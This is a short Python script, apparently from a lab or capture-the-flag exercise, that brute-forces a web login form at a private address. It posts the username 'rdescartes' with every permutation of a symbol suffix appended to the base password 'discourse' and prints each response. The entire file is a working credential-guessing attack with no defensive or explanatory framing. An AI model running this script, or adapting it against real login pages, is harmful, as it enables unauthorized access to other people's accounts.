#!/usr/bin/python3 

import requests as req 
from requests.auth import HTTPBasicAuth
import itertools 


Url = "http://192.168.197.68:8080/login-2/"

username = "rdescartes"
passwordstart = "discourse"
passwordsuffix = "!@#%&"
y = itertools.permutations(passwordsuffix)

for perm in y:
    Url = "http://192.168.197.68:8080/login-2/"
    passwordFull = passwordstart + ''.join(perm)
    print('Trying: ' + passwordFull)
    info = {"username": username , "password": passwordFull}
    x = req.post(Url, data=info)
    print(x.text)

